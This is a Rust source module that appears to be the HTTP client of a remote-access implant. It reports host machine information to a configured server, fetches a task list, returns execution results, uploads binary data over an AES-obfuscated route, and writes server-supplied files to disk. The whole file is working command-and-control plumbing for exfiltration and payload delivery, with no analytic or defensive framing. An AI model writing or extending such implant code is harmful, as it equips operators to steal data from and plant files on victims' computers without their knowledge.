use std::{error::Error, fs::File, io::Write};

use http_req::{request::{self, Request}, uri::Uri};
use serde_json::Value;

use crate::core::{common::{config::Config, ROUTE_DOWNLOAD, ROUTE_ONLINE, ROUTE_RESULT, ROUTE_TASK_LIST, ROUTE_UPLOAD}, model::{ReceiverTask,Tasks}, util::{AESUtil, NetWork, SysUtil}};

use super::{HttpAPI, API};

impl API for HttpAPI{
    fn get_aes_key(&self, config: &Config) -> Result<String, Box<dyn Error>> {
        let uri = if config.use_https {
            format!("https://{}", config.host)
        } else {
            format!("http://{}", config.host)
        };

        let mut result: Vec<u8> = Vec::new();
        request::post(uri, "".as_bytes(), &mut result)?;
        match String::from_utf8(result) {
            Ok(key) => Ok(key),
            Err(_) => panic!("获取aes密钥失败"),
        }
    }

    fn send_online_information(&self, network: &NetWork) -> Result<(String, u64), Box<dyn Error>> {
        let information = SysUtil::machine_information();
        let json_data = serde_json::to_string(&information)?;
        // let encrypt_data = AESUtil::encrypt(&json_data, key)?;
        // println!("data: {:?}", encrypt_data);
        let mut result = Vec::new();
        network.post(ROUTE_ONLINE, &json_data, &mut result)?;
        let data = network.decrypt(result)?;
        match serde_json::from_str::<Value>(&data) {
            Ok(data) => Ok((data["token"].to_string().replace("\"", ""), data["time"].as_u64().unwrap())),
            Err(_) => panic!("failed"),
        }
    }

    fn get_tasklist(&self, network: &NetWork) -> Result<Tasks, Box<dyn Error>> {
        let mut result = Vec::new();
        network.post(ROUTE_TASK_LIST, &"", &mut result)?;
        let data = network.decrypt(result)?;
        Ok(serde_json::from_str(&data)?)
    }

    fn send_execution_result(&self, network: &NetWork, id: &str, data: &str){
        let mut result = Vec::new();
        let json_data = serde_json::to_string(&ReceiverTask{ id: id.to_owned(), result: data.to_owned() });
        if json_data.is_ok() {
            let _ = network.post(ROUTE_RESULT, &json_data.unwrap(), &mut result);
        }
    }

    fn upload_binary(&self, network: &NetWork, id: &str, data: Vec<u8>) {
        let encrypt_uri = AESUtil::encrypt(ROUTE_UPLOAD, &network.config.key).unwrap();
        let uri = if network.config.use_https {
            format!("https://{}/{}", network.config.host, encrypt_uri)
        } else {
            format!("http://{}/{}", network.config.host, encrypt_uri)
        };
        let uri = Uri::try_from(uri.as_ref()).unwrap();
        Request::new(&uri)
            .method(request::Method::POST)
            .header("id", id)
            .header("Content-Length", &data.len())
            .header("token", &network.config.token)
            .body(&data)
            .send(&mut vec![])
            .unwrap();
    }

    fn download_binary(&self, network: &NetWork, id: &str, _path: String) -> Result<(), Box<dyn Error>> {
        let mut result = Vec::new();
        match network.post(ROUTE_DOWNLOAD, &id, &mut result) {
            Ok(response) => {
                if let Some(filename) = response.headers().get("F"){
                    let mut file = File::create(filename)?;
                    file.write(&result)?;
                }
            },
            Err(_) => todo!(),
        }
        Ok(())
    }
    
}